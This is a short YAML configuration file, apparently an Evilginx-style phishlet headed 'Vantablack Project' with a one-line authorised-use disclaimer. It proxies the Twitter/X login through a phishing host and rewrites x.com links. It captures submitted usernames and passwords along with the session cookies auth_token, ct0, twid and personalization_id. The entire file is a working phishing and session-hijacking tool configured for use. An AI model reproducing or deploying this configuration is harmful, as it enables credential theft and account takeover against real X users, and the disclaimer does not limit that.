# VANTABLACK PROJECT | ETHICAL DISCLAIMER: USAGE AUTORISÉ UNIQUEMENT
min_ver: '3.0.0'
proxy_hosts:
  - {phish_sub: 'twitter', orig_sub: 'twitter', domain: 'x.com', session: true, is_landing: true}
  - {phish_sub: 'api', orig_sub: 'api', domain: 'x.com', session: true, is_landing: false}
sub_filters:
  - {triggers_on: 'twitter.x.com', orig_sub: 'twitter', domain: 'x.com', search: 'https://x.com/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/javascript']}
auth_tokens:
  - domain: '.x.com'
    keys: ['auth_token', 'ct0', 'twid', 'personalization_id']
credentials:
  username:
    key: 'session[username_or_email]'
    search: '(.*)'
    type: 'post'
  password:
    key: 'session[password]'
    search: '(.*)'
    type: 'post'
login:
  domain: 'twitter.x.com'
  path: '/login'
